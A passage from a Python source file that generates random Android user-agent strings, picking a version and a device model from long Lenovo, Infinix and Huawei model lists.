'Lenovo TB-8506FS', 'Lenovo TB-8506X', 'Lenovo TB-8705F', 'Lenovo TB-X705L', 'Lenovo TB-X705F', 'Lenovo TB-J606F', 'Lenovo TB-J606L', 'TB350FU', 'Lenovo TB-J616F', 'Lenovo TB-J616X', 'Lenovo TB-J706F', 'Lenovo TB-J706L', 'TB132FU', 'Lenovo TB-Q706F', 'Lenovo TB-Q706Z', 'Lenovo TB-J607F', 'Lenovo PB-6505M', 'Lenovo PB-6505Y', 'Lenovo TB3-X70F', 'Lenovo TB3-X70L', 'Lenovo TB3-730X', 'Lenovo TB3-710I', 'Lenovo TB3-710F', 'Lenovo TB-7703X', '601LV', 'Lenovo TB3-850M', 'Lenovo TB3-850F', '602LV', 'Lenovo TB-8703X', 'Lenovo TB-8703F', 'Lenovo TB-X304L', 'Lenovo TB-X304F', 'Lenovo TB-X704L', 'Lenovo TB-X704F', '701LV', 'Lenovo TB-8504X', 'Lenovo TB-8704X', 'Lenovo TB-8X04F', 'Lenovo TB350XU', 'Lenovo ThinkPad 13', 'ThinkPadTablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'Lenovo A1000m', 'Lenovo vibe a plus', 'Lenovo A2016a40', 'Lenovo A2016a40', 'Lenovo A2020a40', 'VIBE C', 'Lenovo A6020a41', 'Lenovo A6020l36', 'Lenovo A6020a40', 'Lenovo A6020l37', 'Lenovo A6020a46', 'Vibe K5 Plus', 'Lenovo P1a42', 'Lenovo P1c58', 'Lenovo P1a41', 'Vibe P1 Turbo', 'Lenovo P1ma40', 'Lenovo S1c50', 'Lenovo S1a40', 'Lenovo S1La40', 'VIBE_S2i', 'VIBE S3i', 'VIBE S5i', 'VIBE S6i', 'VIBE S6i Plus', 'VIBE S7i', 'Lenovo Z90a40', 'Lenovo Z90-7', 'VIBE V7', 'Lenovo X2-AP', 'Lenovo X2-TO', 'Lenovo X2-TO', 'Lenovo X3c70', 'Lenovo X3c50', 'Lenovo X3a40', 'Lenovo K51c78', 'Lenovo K51c78', 'Lenovo X3 Lite', 'Lenovo K910L', 'Lenovo K910L', 'Lenovo Vibe Z2', 'Lenovo K920', 'Lenovo X2-EU', 'Lenovo X2-EU', 'lenovo x606fa', 'TB138FC', 'Lenovo YT3-X90X', 'Lenovo YT3-X90L', 'Lenovo YT3-X90F', 'Lenovo YB-Q501F', 'Lenovo YB1-X90F', 'Lenovo YB1-X90L', 'Lenovo YT-K606F', 'Lenovo YT-X705L', 'Lenovo YT-X705X', 'Lenovo YT-X705F', 'Lenovo YT-J706F', 'Lenovo YT-J706X', 'Lenovo YT3-X50F', 'Lenovo YT3-X50L', 'Lenovo YT3-X50M', 'Lenovo YT3-850M', 'Lenovo YT3-850M', 'Lenovo YT3-850F', 'Lenovo YT3-850L', 'Lenovo YT-X703F', 'Lenovo YT-X703L', 'Lenovo B8000-H', 'Lenovo B8000-F', 'Yoga Tablet 2', 'Lenovo B6000-F/JDQ39', 'Lenovo B6000-HV', 'Lenovo Z2', 'Lenovo Z2', 'Z2 Plus', 'Lenovo Z2w', 'Lenovo L78011', 'Lenovo L78031', 'Lenovo Z5 Pro', 'Lenovo L78032', 'Lenovo L78071', 'Lenovo L78071', 'Lenovo Z5s', 'Lenovo L78121', 'Lenovo L78121', 'Lenovo L78121', 'Lenovo Z6 Lite', 'Lenovo L78051', 'Lenovo L38111', 'ZUK Z2151', 'ZUK Z2151', 'ZUK Z1', 'ZUK Z2132', 'ZUK Z2132', 'ZUK Z2131', 'ZUK Z2121'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(self.android_version, self.android_model , self.browser_version))
                elif self.jenis == 'Infinix':
                    self.android_version = random.choice(['12', '11', '9'])
                    self.android_model = random.choice(['Infinix F98', 'Infinix G636', 'Infinix X507', 'Infinix X507', 'Infinix Hot 10', 'Infinix X682B', 'Infinix X682C', 'Infinix X682B', 'Infinix X682C', 'MZ-Infinix X688C', 'Infinix X688B', 'Infinix X688C', 'Infinix X688B', 'Infinix X659B', 'Infinix PR652B', 'Infinix PR652B', 'Infinix X658E', 'Infinix PR652C', 'Infinix X689B', 'Infinix X689D', 'Infinix X689D', 'Infinix X689C', 'Infinix X662', 'Infinix X689F', 'MZ-Infinix X662B', 'Infinix X675', 'Infinix X675', 'Infinix X6812B', 'Infinix X6817', 'Infinix X6817B', 'Infinix X6816C', 'Infinix X6816', 'Infinix X6816D', 'Infinix X6816D', 'Infinix X668', 'Infinix X668C', 'Infinix X665B', 'Infinix X665', 'Infinix X665B', 'Infinix X510', 'Infinix X510', 'Infinix X6826B', 'Infinix X6826C', 'Infinix X6826B', 'Infinix X666B', 'Infinix X6825', 'Infinix X665E', 'Infinix X665C', 'Infinix X6827', 'Infinix X6827', 'Infinix HOT 3', 'Infinix HOT 3 LTE', 'Infinix-X554', 'Infinix HOT 3 Pro', 'Infinix X6831', 'Infinix X669', 'Infinix X669C', 'Infinix X669D', 'Infinix HOT 4', 'Infinix HOT 4 Lite', 'Infinix HOT 4 Pro', 'Infinix_X556_LTE', 'Infinix X559C', 'Infinix X559C', 'Infinix X559F', 'Infinix X559C', 'Infinix X606B', 'Infinix X606D', 'Infinix X606D', 'Infinix X606C', 'Infinix X608', 'Infinix X623', 'Infinix X624B', 'ar_AE Infinix X624', 'fr_FR Infinix X624', 'Infinix X625B', 'Infinix X625C', 'Infinix X625C', 'Infinix X625D', 'Infinix X650C', 'Infinix X650D', 'Infinix X650B', 'Infinix X650', 'Infinix X650C Flow', 'Infinix X650B', 'Infinix X650B', 'Infinix X650D', 'Infinix X655C', 'Infinix X655C', 'Infinix X655D', 'Infinix X680B', 'Infinix X655F', 'INFINIX-X551', 'Infinix-X551', 'Infinix-X551', 'INFINIX-X551', 'INFINIX-X551', 'Infinix_X521S', 'Infinix-X521', 'Infinix_X521_LTE', 'Infinix HOT S', 'Infinix-X521', 'Infinix_X521', 'Infinix X573', 'Infinix X573', 'Infinix X573B', 'Infinix X622', 'Infinix X622', 'Infinix Hot V3', 'Infinix HOT4 LTE', 'Infinix X693', 'Infinix X693', 'Infinix X695', 'Infinix X695C', 'Infinix X695D', 'MZ-Infinix X695C', 'Infinix X663', 'Infinix X663B', 'Infinix X697', 'Infinix X697', 'Infinix X698', 'Infinix X698', 'Infinix X670', 'Infinix X670', 'Infinix X676C', 'Infinix X663D', 'Infinix X676B', 'Infinix X671B', 'Infinix X672', 'Infinix X6819', 'Infinix X6819', 'Infinix X6819', 'Infinix X677', 'Infinix X677', 'Infinix-X600-LTE', 'Infinix NOTE 2', 'Infinix-X600-LTE', 'Infinix NOTE 2 LTE', 'Infinix NOTE 3', 'Infinix_X601_LTE', 'Infinix NOTE 3', 'Infinix NOTE 3 Pro', 'Infinix NOTE 3 Pro', 'Infinix X572', 'Infinix X572-LTE', 'Infinix X572', 'Infinix X572', 'Infinix X571', 'Infinix X604', 'Infinix X604B', 'Infinix X605', 'Infinix X610B', 'Infinix X610B', 'Infinix X610B', 'Infinix X690', 'Infinix X690B', 'Infinix X690B', 'Infinix X656', 'Infinix X656', 'Infinix X692', 'Infinix X692', 'Infinix X683B', 'Infinix X450', 'Infinix X5010', 'Infinix X5010', 'Infinix X401', 'Infinix S2', 'Infinix S2 Pro', 'Infinix S2 Pro', 'Infinix X626B', 'Infinix X626B', 'Infinix X626', 'Infinix X626B', 'Infinix X652A', 'Infinix X652', 'Infinix X652', 'Infinix X652A', 'Infinix X652A', 'Infinix X652B', 'Infinix X652C', 'Infinix X660C', 'Infinix X660C', 'Infinix X660B', 'Infinix X660C', 'Infinix X5515F', 'Infinix X5515I', 'Infinix X609', 'fr_MA Infinix X609', 'Infinix X5514D', 'Infinix X5516B', 'Infinix X5516C', 'Infinix X627', 'Infinix X627', 'Infinix X627', 'Infinix X653C', 'Infinix X680', 'Infinix X653', 'ar_AE Infinix X680', 'ar_AE Infinix X653', 'Infinix X680D', 'Infinix X657', 'Infinix X657B', 'Infinix X657C', 'Infinix X657', 'Infinix X657B', 'Infinix X6511', 'Infinix X6511B', 'Infinix X6511E', 'Infinix X6512', 'Infinix X6823', 'Infinix X6823C', 'Infinix X6823B', 'Infinix X6515', 'Infinix X6516', 'Infinix X6517', 'Infinix X612B', 'Infinix X503', 'Infinix X511', 'Infinix X352', 'Infinix X351', 'Infinix X351', 'Infinix X530', 'Infinix X530', 'Infinix X6711', 'Infinix X6716', 'Infinix X678B', 'Infinix Y88', 'Infinix X509', 'Infinix X6821', 'Infinix X6821', 'Infinix-X552', 'Infinix Zero 3', 'Infinix Zero 3', 'Infinix Zero 4', 'Infinix Zero 4 Plus', 'Infinix Zero 4 Plus', 'Infinix X603', 'Infinix X603-LTE', 'Infinix X6815C', 'Infinix X6815D', 'Infinix X6815B', 'Infinix X6815D', 'Infinix X6815C', 'Infinix X620B', 'Infinix X620', 'Infinix X620', 'Infinix X687', 'Infinix X687', 'Infinix X687', 'Infinix X687B', 'Infinix X6820', 'Infinix X6811B', 'Infinix X6811B', 'Infinix X6810', 'Infinix X6810'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Huawei':
                    self.android_version = random.choice(['11', '10', '9'])
                    self.android_model = random.choice(['POT-AL00a', 'POT-TL00a', 'POT-AL00a', 'POT-AL00a', 'POT-AL00a', 'POT-AL00a', 'Huawei Ascend', 'U9500', 'U9500', 'U9500', 'U9500', 'U9500', 'U8818', 'HUAWEI U8818', 'HUAWEI U8818', 'HUAWEI U8818', 'U8818', 'U8818', 'U8818', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'HUAWEI G6-L11', 'G620S-L01', 'C8817D', 'G620S-L03', 'G620S-L01', 'C8817D', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G7-L01', 'HUAWEI G7-L01', 'Huawei G700', 'HUAWEI G700-U20', 'HUAWEI G700-T00', 'HUAWEI G700-U10', 'Huawei g700', 'HUAWEI G700-U00', 'HUAWEI G700-T00', 'HUAWEI G700-U20', 'HUAWEI G700-U10', 'HUAWEI G700-U00', 'HUAWEI G730-C00', 'HUAWEI G730-C00', 'HUAWEI G730-C00', 'HUAWEI MT1-U06', 'HUAWEI MT1-U06', 'HUAWEI MT2-L01', 'HUAWEI MT2-L01', 'HUAWEI MT2-C00', 'HUAWEI MT2-C00', 'MT2L03', 'MT2L03', 'HUAWEI Y360', 'HUAWEI MT7-L09', 'HUAWEI MT7-TL10', 'HUAWEI MT7-TL00', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-3', 'U9202L-1', 'U9202L-1', 'U9202L-4', 'U9202L-2', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-3', 'U9202L-2', 'HUAWEI P6 S-U06', 'HUAWEI P7-L10', 'Flow', 'H1711', 'HUAWEI Y221-U53', 'HUAWEI Y221-U22', 'HUAWEI Y221-U12', 'HUAWEI Y221-U03', 'HUAWEI Y221-U53', 'HUAWEI Y221-U22', 'Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'Bucare Y330-U05', 'Bucare Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'Y550-L03', 'HUAWEI Y560-L01', 'HUAWEI Y541-U02', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'Huawei Blaze', 'Huawei BLAZE', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199s', 'HUAWEI C199s', 'HW-HUAWEI C199s', 'EC6109V1', 'MTS-SP101', 'MTS-SP101', 'MTS-SP101', 'C8512', 'C8600', 'C8600', 'C8600', 'C8600', 'C8650', 'C8650', 'C8650', 'HUAWEI C8655', 'HUAWEI C8655', 'C8800', 'HW-HUAWEI_C8810', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI_C8812', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI C8812E', 'HUAWEI_C8812E', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813DQ', 'HUAWEI C8813DQ', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8815', 'HUAWEI C8815', 'HUAWEI C8816', 'HUAWEI C8816', 'HUAWEI C8816', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI_C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8817E', 'HUAWEI C8817E', 'HUAWEI C8817E', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8818', 'HUAWEI C8818', 'HUAWEI C8818', 'HUAWEI C8825D', 'HUAWEI C8825D', 'HUAWEI C8825D', 'HUAWEI-C8850', 'HUAWEI C8860E', 'HUAWEI C8860E', 'HUAWEI C8860E', 'C8860V', 'HUAWEI C8950D', 'HUAWEI C8950D', 'HUAWEI C8950D', 'HUAWEI C8950D', 'CM980', 'CM980', 'd-02K', 'd-02H', 'd-01J', 'U9510', 'U9510', 'HUAWEI D2', 'Huawei D2', 'HUAWEI D8950D', 'MediaPad 10 FHD', 'dtab01', 'EC6108V9-01', 'ART-AL00x', 'ART-AL00x', 'ART-AL00x', 'ART-TL00x', 'ART-AL00m', 'ART-AL00x', 'STK-AL00', 'STK-AL00', 'STK-AL00', 'STK-TL00', 'MED-TL00', 'MED-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-TL00', 'WKG-AN00', 'WKG-AN00', 'WKG-TN00', 'WKG-TN00', 'FRL-TN00', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-TN00', 'FRL-AN00a', 'DVC-TN20', 'DVC-AN20', 'DVC-TN20', 'DVC-AN20', 'DVC-AN20', 'DVC-AN20', 'DVC-TN20', 'DVC-TN20', 'DVC-AN20', 'DVC-TN20', 'MLD-AL00', 'MLD-AL00', 'MGA-AL00', 'MGA-AL00', 'MGA-AL00', 'MGA-AL00', 'CTR-AL00', 'CTR-AL00', 'CTR-AL00', 'CTR-AL00', 'HUAWEI TAG-L01', 'HUAWEI TAG-L32', 'HUAWEI TAG-AL00', 'HUAWEI TAG-L21', 'HUAWEI TAG-L13', 'HUAWEI TAG-L03', 'NCE-TL10', 'NCE-AL10', 'NCE-AL00', 'NCE-TL10', 'NCE-AL00', 'NCE-AL10', 'DIG-TL10', 'DIG-AL00', 'DIG-AL00', 'DIG-AL00', 'DIG-AL00', 'SLA-TL10', 'SLA-AL00', 'SLA-TL10', 'SLA-TL10', 'TRT-AL00A', 'TRT-TL10A', 'FIG-AL10', 'FIG-TL10', 'FIG-AL00', 'FIG-TL00', 'FIG-AL10', 'LDN-TL20', 'LDN-AL20', 'LDN-AL10', 'LDN-TL00', 'LDN-TL20', 'FLA-AL10', 'FLA-AL10', 'FLA-AL10', 'ATU-AL10', 'DUB-AL00a', 'DUB-AL00a', 'DUB-AL00a', 'MRD-AL00', 'Huawei Enjoy 9s', 'Huawei Enjoy 9s', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'CM990', 'CM990', 'CM990', 'U8665', 'HUAWEI U8665', 'U8665', 'G735-L03', 'G735-L23', 'G735-L12', 'G735-L23', 'G735-L23', 'CHC-U03', 'CHC-U01', 'Huawei G500 pro', 'HUAWEI G510', 'HUAWEI G510', 'Huawei G510', 'Huawei G520', 'HUAWEI G520 T', 'HUAWEIG520L', 'HUAWEI G520T', 'Huawei G530', 'Huawei G600', 'Huawei G610 u20', 'Huawei G610', 'HUAWEI G610', 'HUAWEI G610 fa', 'HUAWEI G620', 'G621-TL00', 'G621-TL00M', 'G621-TL00', 'HUAWEI G628', 'HUAWEI G7', 'HUAWEI RIO-TL00', 'HUAWEI RIO-UL00', 'HUAWEI_G750', 'Huawei_g750', 'HUAWEI G750', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'Huawei G760', 'HUAWEI RIO-L01', 'HUAWEI VNS-AL00', 'HUAWEI VNS-TL00', 'HUAWEI MLA-TL00', 'HUAWEI MLA-TL00', 'HUAWEI G9 Youth', 'DIG-L21', 'DIG-L22', 'HUAWEI KII-L21', 'BLL-L22', 'BLL-L21', 'BLL-L21', 'HUAWEI NMO-L31', 'HUAWEI RIO-L03', 'H1611', 'H1611', 'H1621', 'H1621', 'HUAWEI H1621', 'H1623', 'H710VL', 'H715BL', 'H866C', 'H866C', 'H866C', 'H866C', 'H866C', 'Huawei-H867G', 'Huawei-H867G', 'Huawei-H867G', 'Huawei-H867G', 'HUAWEI H868C', 'HUAWEIH868C', 'HUAWEI H868C', 'HUAWEI H871G', 'HUAWEI H871G', 'HUAWEI H871G', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI_H881C', 'H882L', 'H882L', 'HUAWEI H891L', 'HUAWEI H892L', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'HUAWEI U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'COL-L29', 'COL-AL10', 'COL-L29', 'HRY-LX1', 'HRY-LX1MEB', 'HRY-AL00', 'HRY-AL00a', 'HRY-LX1T', 'HUAWEI U9508', 'HUAWEI U9508', 'HUAWEI U9508', 'YAL-L21', 'LRA-AL00', 'LRA-AL00', 'LRA-AL00', 'LRA-AL00', 'YAL-AL10', 'YAL-AL10', 'YAL-AL10', 'YAL-AL10', 'YAL-L41', 'YAL-L41', 'HRY-AL00T', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00T', 'HRY-AL00Ta', 'YAL-AL50', 'MAR-LX1H', 'MAR-LX1H', 'BMH-AN20', 'BMH-AN10', 'BMH-AN10', 'MXW-AN00', 'MXW-AN00', 'MXW-AN00', 'MXW-AN00', 'MXW-TN00', 'MXW-AN00', 'MXW-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN10', 'EBG-AN10', 'LRA-LX1', 'CDY-NX9A', 'CDY-AN95', 'CDY-AN90', 'HONOR H30-L01M', 'H30-U10', 'H30-T10', 'H30-T00', 'H30-C00', 'Hol-U19', 'Hol-U19', 'Hol-U19', 'HUAWEI G750-T01', 'HUAWEI G750-T01', 'HUAWEI G750-T01', 'SCL-AL00', 'SCL-TL00', 'SCL-TL00H', 'SCL-AL00', 'SCL-CL00', 'SCL-TL00H', 'SCL-AL00', 'SCL-AL00', 'CHM-U01', 'Honor 4c Pro', 'Honor 4c pro', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'Che1-CL20', 'Che2-UL00', 'Che2-TL00M', 'CHE2-TL00', 'CHE-TL00', 'Che1-CL10', 'Che2-TL00', 'CHE-TL00H', 'Che2-L11', 'CUN-AL00', 'CUN-TL00', 'CUN-TL00', 'NTH-AN00', 'NTH-NX9', 'NTH-AN00', 'NTN-L22', 'NTN-LX3', 'NTN-LX1', 'RNA-AN00', 'JLH-AN00', 'JLH-AN00', 'CAM-AL00', 'CAM-TL00', 'CAM-AL00', 'NEM-AL10', 'NEM-L51', 'NEM-UL10', 'NEM-L51', 'NEM-L22', 'KIW-L21', 'KIW-AL10', 'KIW-UL00', 'KIW-TL00', 'H60-L02', 'H60-L04', 'H60-L01', 'H60-L02', 'H60-L03', 'H60-L11', 'H60-L01', 'MYA-TL10', 'huawei mya-tl10', 'PE-UL00', 'PE-TL20', 'PE-UL00', 'PE-TL10', 'PE-UL00', 'PE-TL10', 'GIA-AN00', 'DLI-TL20', 'DLI-L22', 'DLI-L42', 'DIG-L21HN', 'JMM-L22', 'BLN-L21', 'BLN-L22', 'BLN-AL10', 'BLN-AL10', 'BLN-AL30', 'PLK-AL10', 'PLK-UL00', 'PLK-L01', 'PLK-AL10', 'PLK-TL01H', 'PLK-UL00', 'NEM-L21', 'FNE-AN00', 'FNE-AN00', 'FNE-NX9', 'AUM-AL20', 'AUM-L33', 'AUM-AL00', 'AUM-TL20', 'AUM-AL20', 'AUM-L29', 'AUM-L41', 'LND-AL30', 'LND-L29', '720x1358', 'ATH-AL00', 'ATH-CL00', 'ATH-TL00H)', 'ATH-UL00)', 'ATH-AL00', 'ATH-AL00', 'ATH-AL00', 'ATH-TL00H', 'DUA-L22', 'DUA-LX3', 'BND-AL10', 'BND-L21', 'FRD-L09', 'FRD-AL00', 'FRD-L19', 'PRA-AL00X', 'PRA-TL10', 'DUK-L09', 'VEN-L22', 'JAT-L29', 'JAT-LX3', 'JAT-LX1', 'JAT-L41', 'BKK-AL10', 'BKK-LX2', 'BKK-L21', 'BKK-LX2', 'KSA-LX9', 'KSA-LX9', 'JSN-L21', 'JSN-L22', 'JSN-AL00a', 'JSN-L23', 'ARE-AL00', 'ARE-L22HN', 'STF-L09', 'STF-L09S', 'STF-AL10', 'STF-AL10', 'STF-AL00', 'LLD-L31', 'LLD-AL10', 'MOA-LX9N', 'U', '720x1470', 'AKA-L29', 'LLD-AL20', 'LLD-AL30', 'LLD-AL20', 'LLD-AL20', 'DUA-LX9', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00a', 'HLK-AL00', 'HLK-L42', 'HLK-AL10', 'HLK-L41', 'HLK-AL10', 'HLK-AL10', 'CAM-UL00', 'CAM-UL00', 'NTS-AL00', 'NTS-AL00', 'NTS-AL00', 'TNY-AL00', 'TNY-TL00', 'TNY-AL00', 'TNY-AL00', 'ELZ-AN10', 'ELZ-AN20', 'ANY-LX1', 'LGE-NX9', 'LGE-AN10', 'LGE-AN20', 'MGI-AN00', 'PGT-N19', 'RVL-AL09', 'RVL-AL09', 'RVL-AL09', 'EDI-AL10', 'VKY-TL00', 'VKY-TL00', 'VKY-TL00', 'VKY-TL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'ANA-AL00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-NX9', 'JDN-W09', 'JDN-AL00', 'JDN-W09', 'AGR-W09HN', 'COR-L29', 'COR-AL10', 'KOZ-AL00', 'KOZ-AL00', 'KOZ-AL00', 'HJC-LX9', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'KSA-AL10', 'huawei ksa-al10', 'TNNH-AN00', 'TNNH-AN00', 'TNNH-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'CHM-TL00', 'CHM-UL00', 'HW-CHM-CL00', 'CHM-UL00', 'CHM-TL00H', 'CHM-UL00', 'CHM-TL00H', 'CHM-TL00', 'CHM-UL00', 'AKA-AL10', 'HJC-AN90', 'NEW-AN90', 'KOZ-AL40', 'KOZ-AL40', 'DUA-AL00', 'DUA-TL00', 'JAT-AL00', 'MOA-AL00', 'MOA-AL00', 'JDN2-AL00HN', 'JDN2-W09HN', 'AGS2-AL00HN', 'BKL-L09', 'BKL-AL20', 'BKL-AL00', 'PCT-TL10', 'PCT-AL10', 'PCT-AL10', 'ALA-AN70', 'KNT-AL10', 'KNT-AL20', 'KNT-AL20', 'KNT-UL10', 'KNT-TL10', 'DUK-AL20', 'DUK-AL20', 'DUK-AL20', 'JMM-AL00', 'JMM-AL10', 'JMM-TL10', 'JMM-AL00', 'BKL-L04', 'PCT-L29', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN10', 'OXF-AN10', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00', 'TEL-AN00a', 'TEL-AN10', 'TEL-AN00a', 'TEL-AN00a', 'TEL-TN00', 'TEL-AN10', 'Honor X10 Lite', 'DNN-LX9', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'Honor X10 Max', 'Honor X10 Pro', 'KKG-AN70', 'TFY-AN00', 'ADT-AN00', 'ADT-AN00', 'DIO-AN00', 'VNA-LX2', 'VNE-LX2', 'VNE-LX1', 'VNE-LX3', 'CMA-LX1', 'CMA-LX2', 'RKY-LX1', 'RKY-LX2', 'RKY-LX3', 'TFY-LX2', 'TFY-LX1', 'TFY-LX3', 'VNE-N41', 'CRT-LX1', 'CRT-LX3', 'CRT-LX2', 'ANY-LX2', 'ANY-LX3', 'ANY-NX1', 'RMO-NX1', 'RMO-NX1', 'HUAWEI SCL-L01', 'HUAWEI SCL-L21', 'HUAWEI LYO-L21', 'LYO-L21', 'Y538', 'Y538', 'Ideos', 'Ideos', 'IDEOS S7', 'IDEOS S7 Slim', 'IDEOS S7 Slim', 'Huawei Ideos X1', 'IDEOS X1', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8510', 'rv:35.0', 'rv:13.0', 'U8510', 'Huawei U8510', 'Huawei IDEOS X3', 'Huawei U8510 X3', 'HUAWEI U8510', 'u8800', 'U8800', 'U8800', 'U8800', 'Huawei Ideos X5', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'Huawei IDEOS X8', 'JNY', 'HUAWEI_M2', 'HUAWEI-M391', 'M650', 'M650', 'M650', 'M660', 'M660', 'M660', 'M660', 'Android 2.3.6', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'Android 2.2.2', 'HUAWEI-M860', 'HUAWEI-M860', 'HUAWEI-M860', 'HUAWEI-M860', 'Huawei M865', 'USCCADR3305', 'USCCADR3305', 'M865', 'USCCADR3305', 'M865', 'M865', 'M865', 'M865', 'Android 2.3.6', 'M865C', 'M865C', 'M865C', 'M865C', 'USCCADR3310', 'USCCADR3310', 'USCCADR3310', 'M866', 'HUAWEI M866',\
                                                         'USCCADR3310', 'M866', 'HUAWEI M866', 'M866', 'USCCADR3310', 'HUAWEI M868', 'HUAWEI M881', 'HUAWEI M881', 'M886', 'M886', 'M886', 'M886', 'M886', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M921', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI RIO-AL00', 'HUAWEI RIO-AL00', 'HUAWEI RIO-AL00', 'HUAWEI MLA-AL10', 'HUAWEI MLA-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TYH601M', 'TYH601M', 'TYH601M', 'TYH601M', 'TYH601M', 'ALP-AL00', 'ALP-L29', 'ALP-AL00', 'ALP-AL00', 'ALP-AL00', 'ALP-AL00', 'RNE-L21', 'RNE-L01', 'RNE-L23', 'BLA-L29', 'BLA-L09', 'BLA-A09', 'BLA-AL00', 'HMA-L29', 'HMA-L09', 'HMA-AL00', 'HMA-AL00', 'HMA-AL00', 'HMA-AL00', 'HMA-L29', 'SNE-LX1', 'SNE-LX3', 'LYA-L29', 'LYA-L09', 'LYA-AL00', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 